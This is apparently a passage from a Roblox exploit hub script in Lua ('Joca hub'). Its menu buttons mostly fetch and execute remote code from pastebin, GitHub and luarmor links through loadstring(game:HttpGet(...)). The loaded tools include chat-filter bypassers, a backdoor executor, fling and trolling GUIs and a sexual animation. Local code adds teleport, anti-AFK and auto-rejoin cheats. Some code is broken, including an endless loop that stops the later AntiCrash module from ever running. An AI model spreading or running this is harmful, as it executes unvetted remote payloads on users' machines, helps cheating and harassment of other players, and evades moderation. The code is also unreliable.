sectionExtras:NewButton("Shaders", "cool graphics", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/randomstring0/pshade-ultimate/refs/heads/main/src/cd.lua'))()
end)

sectionExtras:NewButton("Ping Visualizer", "UNC test check console", function()
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer
local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()

local rainbow_mode = true   --Set to true to enable rainbow mode fr
local lerp = true   --your highly making movement better local.
local lerptime = 0.4

for _, part in ipairs(workspace:GetChildren()) do
    if part:IsA("BasePart") and part.Name:match("^VisualizerPart_") then
        part:Destroy()
    end
end

if character:FindFirstChild("VisualizerLabel") then
    character:FindFirstChild("VisualizerLabel"):Destroy()
end


local baseParts = {}
for _, part in ipairs(character:GetDescendants()) do
    if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
        local isAccessory = part:FindFirstAncestorWhichIsA("Accessory")
        if not isAccessory then
            table.insert(baseParts, part)
        end
    end
end

local visualParts = {}
for i, part in ipairs(baseParts) do
    local p = Instance.new("Part")
    p.Anchored = true
    p.CanCollide = false
    p.Size = part.Size
    p.Material = Enum.Material.Neon
    p.Color = Color3.new(1, 1, 1)
    p.Transparency = 0.55
    p.Name = "VisualizerPart_" .. i
    p.Parent = workspace
    table.insert(visualParts, p)
end

local headIndex
for i, part in ipairs(baseParts) do
    if part.Name == "Head" then
        headIndex = i
        break
    end
end

local billboardGui
local textLabel

if headIndex then
    local headVisual = visualParts[headIndex]
    billboardGui = Instance.new("BillboardGui")
    billboardGui.Size = UDim2.new(0, 220, 0, 50)
    billboardGui.StudsOffset = Vector3.new(0, 1, 0)
    billboardGui.AlwaysOnTop = true
    billboardGui.Name = "VisualizerLabel"
    billboardGui.Parent = headVisual

    textLabel = Instance.new("TextLabel")
    textLabel.Size = UDim2.new(1, 0, 1, 0)
    textLabel.BackgroundTransparency = 1
    textLabel.TextColor3 = Color3.new(1, 1, 1)
    textLabel.TextStrokeTransparency = 0
    textLabel.Font = Enum.Font.SourceSansBold
    textLabel.TextScaled = true
    textLabel.Parent = billboardGui
end

local cframeBuffer = {}

local function getRainbowColor(time)
    local hue = (time % 3) / 3
    return Color3.fromHSV(hue, 1, 1)
end

RunService.RenderStepped:Connect(function()
    local ping = LocalPlayer:GetNetworkPing() or 0.1
    local delayTime = ping

    if textLabel then
        local msPing = math.floor(ping * 2000)  
        textLabel.Text = string.format("%s's Visualizer (%dms delay)", LocalPlayer.Name, msPing)
    end

    local snapshot = {}
    for _, part in ipairs(baseParts) do
        table.insert(snapshot, part.CFrame)
    end
    table.insert(cframeBuffer, {
        tick = tick(),
        cframes = snapshot,
    })

    while #cframeBuffer > 0 and tick() - cframeBuffer[1].tick > delayTime / 0.5 do
        table.remove(cframeBuffer, 1)
    end

    if #cframeBuffer > 0 then
        local delayed = cframeBuffer[1]
        for i = 1, #visualParts do
            if not lerp then
                visualParts[i].CFrame = delayed.cframes[i]
            else
                local currentCFrame = visualParts[i].CFrame
                local targetCFrame = delayed.cframes[i]

                visualParts[i].CFrame = currentCFrame:Lerp(targetCFrame, lerptime)
            end
        end
    end

    if rainbow_mode then
        local rainbowColor = getRainbowColor(tick())
        for _, part in ipairs(visualParts) do
            part.Color = rainbowColor
        end
    end
end)
end)

sectionExtras:NewButton("Fly GUI", "Opens Fly GUI", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/XNEOFF/FlyGuiV3/main/FlyGuiV3.txt"))()
end)

sectionExtras:NewButton("JOCA STYLE ￰ﾟﾐﾟ", "yessss", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/jizkss/Joca-style/refs/heads/main/README.md'))()
end)
-- ============
-- CHAT BYPASS
-- ==============
ChatSection:NewButton("FE Catbypasser", "Catbypasser", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/shadow62x/catbypass/main/upfix"))()
end)

ChatSection:NewButton("FE Gaze Bypass V4", "Works all games", function()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Gaze-bypass-Altered-21081"))()
end)

-- TELEPORT SYSTEM
-- Teleport to player by name
sectionExtras:NewTextBox("Teleport To Player", "Enter player name", function(input)
    if input == "" then return end
    local target = nil
    local linput = input:lower()
    for _,plr in pairs(Players:GetPlayers()) do
        if plr.Name:lower():find(linput) then
            target = plr
            break
        end
    end
    if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") and rootPart then
        rootPart.CFrame = target.Character.HumanoidRootPart.CFrame + Vector3.new(0,5,0)
    else
        warn("Player not found or character not ready!")
    end
end)

-- Teleport dropdown
local playerNames = {}
local function refreshPlayerNames()
    playerNames = {}
    for _,plr in pairs(Players:GetPlayers()) do
        if plr ~= LocalPlayer then
            table.insert(playerNames, plr.Name)
        end
    end
end

refreshPlayerNames()

sectionExtras:NewDropdown("Teleport To Player (Select)", "Select player from list", playerNames, function(selected)
    local plr = Players:FindFirstChild(selected)
    if plr and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") and rootPart then
        rootPart.CFrame = plr.Character.HumanoidRootPart.CFrame + Vector3.new(0,5,0)
    else
        warn("Player not found or not ready!")
    end
end)

Players.PlayerAdded:Connect(function()
    refreshPlayerNames()
end)

Players.PlayerRemoving:Connect(function()
    refreshPlayerNames()
end)

-- AUTO REJOIN
local autoRejoinConn
local autoRejoinEnabled = false
sectionExtras:NewToggle("Auto Rejoin", "Reconnects if kicked from server", function(state)
    autoRejoinEnabled = state
    if state then
        if autoRejoinConn then autoRejoinConn:Disconnect() end
        autoRejoinConn = LocalPlayer.OnTeleport:Connect(function(teleportState)
            if teleportState == Enum.TeleportState.Started and autoRejoinEnabled then
                TeleportService:Teleport(game.PlaceId, LocalPlayer)
            end
        end)
    else
        if autoRejoinConn then autoRejoinConn:Disconnect() end
    end
end)

-- ANTI AFK
local antiAfkConn
local antiAfkEnabled = false
sectionExtras:NewToggle("Anti AFK", "Prevents getting kicked", function(state)
    antiAfkEnabled = state
    if state then
        antiAfkConn = RunService.Heartbeat:Connect(function()
            if antiAfkEnabled then
                VirtualInputManager:SendKeyEvent(true, "A", false, game)
                VirtualInputManager:SendKeyEvent(false, "A", false, game)
            end
        end)
    else
        if antiAfkConn then antiAfkConn:Disconnect() end
    end
end)

-- INFINITE JUMP (MOVED TO PLAYER MODS SECTION)
local infiniteJumpEnabled = false
UserInputService.JumpRequest:Connect(function()
    if infiniteJumpEnabled and humanoid then
        humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
    end
end)

-- TELEPORT TO MOUSE
local teleportToMouseEnabled = false
sectionExtras:NewToggle("Teleport to Mouse (T toggle)", "Teleport to mouse position with T", function(state)
    teleportToMouseEnabled = state
end)

UserInputService.InputBegan:Connect(function(input, gp)
    if gp then return end
    if input.KeyCode == Enum.KeyCode.T and teleportToMouseEnabled and rootPart then
        local mouse = LocalPlayer:GetMouse()
        local target = mouse.Hit.Position
        rootPart.CFrame = CFrame.new(target + Vector3.new(0, 3, 0))
    end
end)

-- =========================
-- ANIMATIONS
-- =========================
sectionAnimations:NewButton("FE roblox idles, runs...", "FE Scripts", function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/Gazer-Ha/Reimagined/refs/heads/main/FE%20Animation%20editor'))()
end)

sectionAnimations:NewButton("FE jerk off (r15)", "FE Scripts", function()
loadstring(game:HttpGet("https://pastefy.app/YZoglOyJ/raw"))()
end)

sectionAnimations:NewButton("FE Aqua Matrix", "FE Scripts", function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/ExploitFin/AquaMatrix/refs/heads/AquaMatrix/AquaMatrix"))()
end)

sectionAnimations:NewButton("FE Animations", "FE Animations", function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/Eazvy/public-scripts/main/Universal_Animations_Emotes.lua"))()
end)

sectionAnimations:NewButton("FE Animations V2(r15)", "FE Animations V2", function()
     loadstring(game:HttpGet("https://pastebin.com/raw/1nJD7PkH",true))()
end)

sectionAnimations:NewButton("Forsaken Animations (r6)", "FE", function()
     loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/b30aae8f2ef544de8c9d1f8b849e6bdb.lua"))()
end)

sectionAnimations:NewButton("FE Classic Animations (r6)", "FE Classic Animations", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/vixonpolska/FEClassicAnimations/refs/heads/main/Animations.lua",true))()
end)

-- =========================
-- HUBS
-- =========================

sectionHUBS:NewButton("Part Controller Hub", "Anchored Parts", function()
pcall(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/hm5650/PartController/refs/heads/main/PartController.lua", true))()
end)
end)

sectionHUBS:NewButton("SkyHub GUI", "Opens Trolling GUI", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/yofriendfromschool1/Sky-Hub/main/SkyHub.txt"))()
end)

sectionHUBS:NewButton("Joca Backdoor Executor", "Only works in backdoored games", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/jizkss/joca-executor/refs/heads/main/README.md"))()
end)

sectionHUBS:NewButton("Hat Hub(KEY)", "c00lkidd advanced gui", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/inkdupe/hat-scripts/refs/heads/main/updatedhathub.lua"))()
end)

sectionHUBS:NewButton("c00lclan", "c00lkidd advanced gui", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/14EU4i8n",true))()
end)

sectionHUBS:NewButton("FE Fling GUI", "FE Fling GUI", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/Mkt6djAP",true))()
end)

sectionHUBS:NewButton("Xenith HUB(KEY)", "Xenith HUB", function()
     loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/d7be76c234d46ce6770101fded39760c.lua"))()
end)

sectionHUBS:NewButton("FE Trolling HUB", "FE Trolling HUB", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/yofriendfromschool1/Sky-Hub/main/FE%20Trolling%20GUI.luau"))()
end)

sectionHUBS:NewButton("GHUB 15", "GHUB 15", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/gclich/GHUBV15_X_ZENXOS-MAINLOADER/refs/heads/main/GHUB-X-ZENXOS-V15.txt"))()
end)

sectionHUBS:NewButton("Billzzard Hub V2", "Billzzard Hub V2", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/uaahjajajqoqiqkqhwhwhw/Blizzard-Hub-Official/main/Blizzard%20Hub%20V2.lua", true))()
end)

sectionHUBS:NewButton("Slicer V6", "Slicer V6", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Ahma174/Slicer/refs/heads/main/Slicer%20Fe%20V6"))()
end)

sectionHUBS:NewButton("System Broken", "System Broken", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/H20CalibreYT/SystemBroken/main/script"))()
end)

sectionHUBS:NewButton("FE c00lkidd GUI", "Functional c00lkidd GUI", function()
     loadstring(game:HttpGet("https://pastebin.com/raw/AczzXtnG"))()
end)

-- Initialize ESP and player list on start
updateESP()
refreshPlayerNames()

print("Joca hub GUI loaded")

-- Script to show Ping and FPS (Corrected Version)
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local StatsService = game:GetService("Stats")

local player = Players.LocalPlayer

-- Wait for player to load
if not player then
    player = Players.LocalPlayer
end

-- Create interface
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "PingFPSDisplay"
screenGui.ResetOnSpawn = false
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.DisplayOrder = 999  -- Ensure it stays in front

local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.Size = UDim2.new(0, 150, 0, 50)
mainFrame.Position = UDim2.new(0, 10, 0, 67)
mainFrame.BackgroundTransparency = 1
mainFrame.BackgroundColor3 = Color3.new(0, 0, 0)
mainFrame.BorderSizePixel = 0
mainFrame.Parent = screenGui

local displayText = Instance.new("TextLabel")
displayText.Name = "DisplayText"
displayText.Size = UDim2.new(1, 0, 1, 0)
displayText.Position = UDim2.new(0, 0, 0, 0)
displayText.BackgroundTransparency = 1
displayText.TextColor3 = Color3.new(0.2, 0.6, 1)  -- Blue
displayText.TextSize = 18
displayText.Font = Enum.Font.GothamSemibold
displayText.Text = "Loading..."
displayText.TextXAlignment = Enum.TextXAlignment.Left
displayText.TextYAlignment = Enum.TextYAlignment.Top
displayText.TextStrokeTransparency = 0.7
displayText.TextStrokeColor3 = Color3.new(0, 0, 0)
displayText.Parent = mainFrame

-- Function to get ping
local function getPing()
    local success, ping = pcall(function()
        return StatsService.Network.ServerStatsItem["Data Ping"]:GetValue()
    end)
    
    if success and ping then
        return math.floor(ping)
    else
        -- Try alternative method
        success, ping = pcall(function()
            return game:GetService("Stats").PerformanceStats.Ping:GetValue()
        end)
        
        if success and ping then
            return math.floor(ping)
        else
            return 0
        end
    end
end

-- Variables for FPS
local fps = 0
local frameCount = 0
local lastTime = os.clock()

-- Function to update display
local function updateDisplay()
    local ping = getPing()
    displayText.Text = string.format("FPS: %d\nPing: %d ms", fps, ping)
end

-- Connect to Heartbeat for more accurate calculation
local connection
connection = RunService.Heartbeat:Connect(function()
    frameCount = frameCount + 1
    local currentTime = os.clock()
    local elapsed = currentTime - lastTime
    
    if elapsed >= 0.5 then  -- Update every 0.5 seconds for more responsiveness
        fps = math.floor(frameCount / elapsed)
        frameCount = 0
        lastTime = currentTime
        updateDisplay()
    end
end)

-- Wait for PlayerGui to be ready
local function initialize()
    local playerGui = player:WaitForChild("PlayerGui")
    screenGui.Parent = playerGui
    displayText.Text = "FPS: 0\nPing: 0 ms"
    
end

-- Initialize
if player:FindFirstChild("PlayerGui") then
    initialize()
else
    player:WaitForChild("PlayerGui")
    initialize()
end

-- rgb chat
local s1 = game:GetService("TextChatService")
local s2 = game:GetService("RunService")
local s3 = game:GetService("CoreGui")

local v1 = 0.45
local t1 = {}

local function f1()
    local c = s1:FindFirstChildOfClass("BubbleChatConfiguration")
    if c then
        
        c.BackgroundColor3 = Color3.fromRGB(40, 40, 40)-- bg color cfg
        c.MaxDistance = c.MaxDistance * 2 -- bubble chat distance
        c.VerticalStudsOffset = 0.3 -- vert offset
        
        local g = c:FindFirstChildOfClass("UIGradient")
        if g then
            g:Destroy()
        end
    end
end

local function f2(i)
    if i and i:IsA("TextLabel") and i.Name == "Text" then
        if i.Parent and i.Parent.Name == "ChatBubbleFrame" then
            return true
        end
    end
    return false
end

local function f3(l)
    if t1[l] then return end
    t1[l] = true
    task.spawn(function()
        while t1[l] and l.Parent do
            local h = (tick() * v1) % 1
            l.TextColor3 = Color3.fromHSV(h, 1, 1)
            s2.Heartbeat:Wait()
        end
    end)
    l.AncestryChanged:Once(function(_, p)
        if not p then
            t1[l] = nil
        end
    end)
end

local function f4(d)
    if f2(d) then
        f3(d)
    end
end

f1()
local r = s3:FindFirstChild("ExperienceChat")
if r then
    r.DescendantAdded:Connect(f4)
    for _, d in ipairs(r:GetDescendants()) do
        if f2(d) then
            f3(d)
        end
    end
end

-- Keep script running
while true do
    task.wait(5)  -- Use task.wait() instead of wait()
end

-- Anti-Crash System
local AntiCrash = {}

-- Configurations
AntiCrash.Config = {
    DebugMode = false, -- Activate for detailed logs
    MaxLoopIterations = 10000, -- Maximum iterations in loops
    MaxFunctionCalls = 500, -- Maximum recursive calls
    MemoryCheckInterval = 30, -- Check memory every X seconds
    MaxMemoryUsage = 1024 * 1024 * 100, -- 100MB maximum
    SafeMode = true -- Execute functions in safe mode
}

-- Internal variables
AntiCrash._loopCounters = {}
AntiCrash._functionCallCount = {}
AntiCrash._lastMemoryCheck = os.time()
AntiCrash._protectedFunctions = {}

-- Function for log
function AntiCrash.Log(message)
    if AntiCrash.Config.DebugMode then
        print("[ANTI-CRASH] " .. message)
    end
end

-- Memory checker
function AntiCrash.CheckMemory()
    local currentTime = os.time()
    if currentTime - AntiCrash._lastMemoryCheck >= AntiCrash.Config.MemoryCheckInterval then
        collectgarbage("collect")
        local memory = collectgarbage("count") * 1024 -- Convert to bytes
        
        if memory > AntiCrash.Config.MaxMemoryUsage then
            AntiCrash.Log("ALERT: High memory usage: " .. memory .. " bytes")
            collectgarbage("collect") -- Force garbage collection
        end
        
        AntiCrash._lastMemoryCheck = currentTime
    end
end

-- Loop protector
function AntiCrash.ProtectedLoop(callback, loopName)
    loopName = loopName or "unnamed"
    AntiCrash._loopCounters[loopName] = 0
    
    return function(...)
        AntiCrash._loopCounters[loopName] = AntiCrash._loopCounters[loopName] + 1
        
        if AntiCrash._loopCounters[loopName] > AntiCrash.Config.MaxLoopIterations then
            AntiCrash.Log("Loop interrupted: " .. loopName .. " exceeded limit")
            return false
        end
        
        return callback(...)
    end
end

-- Recursive function protector
function AntiCrash.ProtectedCall(func, funcName, ...)
    funcName = funcName or "anonymous"
    AntiCrash._functionCallCount[funcName] = (AntiCrash._functionCallCount[funcName] or 0) + 1
    
    if AntiCrash._functionCallCount[funcName] > AntiCrash.Config.MaxFunctionCalls then
        AntiCrash.Log("Recursive call interrupted: " .. funcName)
        return nil, "call limit exceeded"
    end
    
    -- Execute in protected mode
    local success, result = pcall(func, ...)
    
    if not success then
        AntiCrash.Log("Error captured in " .. funcName .. ": " .. tostring(result))
        return nil, result
    end
    
    return result
end

-- Safe wrapper for functions
function AntiCrash.SafeFunction(func, funcName)
    funcName = funcName or "anonymous"
    
    return function(...)
        return AntiCrash.ProtectedCall(func, funcName, ...)
    end
end

-- Safe type checker
function AntiCrash.SafeTypeCheck(value, expectedType, defaultValue)
    if type(value) ~= expectedType then
        AntiCrash.Log("Incorrect type. Expected: " .. expectedType .. ", Got: " .. type(value))
        return defaultValue
    end
    return value
end

-- Global error handler
function AntiCrash.GlobalErrorHandler(err)
    AntiCrash.Log("GLOBAL ERROR CAPTURED: " .. tostring(err))
    
    -- Try to recover or gracefully terminate
    if AntiCrash.Config.SafeMode then
        return nil
    else
        error(err) -- Re-throw error if safe mode is disabled
    end
end

-- Initialize anti-crash system
function AntiCrash.Initialize()
    -- Replace global error function
    local oldError = error
    _G.error = function(msg, level)
        AntiCrash.GlobalErrorHandler(msg)
        oldError(msg, (level or 1) + 1)
    end
    
    -- Protect critical functions
    _G.pcall = AntiCrash.SafeFunction(pcall, "pcall")
    _G.xpcall = AntiCrash.SafeFunction(xpcall, "xpcall")
    
    AntiCrash.Log("Anti-Crash System initialized")
end

-- Performance monitor
function AntiCrash.PerformanceMonitor()
    local startTime = os.clock()
    
    return function()
        local endTime = os.clock()
        local executionTime = endTime - startTime
        
        if executionTime > 5.0 then -- 5 seconds
            AntiCrash.Log("ALERT: Slow operation detected: " .. executionTime .. " seconds")
        end
        
        return executionTime
    end
end

-- Clear counters
function AntiCrash.Cleanup()
    AntiCrash._loopCounters = {}
    AntiCrash._functionCallCount = {}
    collectgarbage("collect")
    AntiCrash.Log("Counters cleared and memory freed")
end

-- Example usage integrated
function AntiCrash.ExampleUsage()
    -- Example of protected loop
    local protectedFor = AntiCrash.ProtectedLoop(function(i)
        -- Your loop code here
        print("Iteration: " .. i)
    end, "example_loop")
    
    for i = 1, 100 do
        if not protectedFor(i) then break end
    end
    
    -- Example of protected function
    local safeFunction = AntiCrash.SafeFunction(function(a, b)
        return a + b
    end, "safe_sum")
    
    local result = safeFunction(5, 3)
    print("Safe result: " .. tostring(result))
end

-- Auto-initialization when script loads
AntiCrash.Initialize()

return AntiCrash
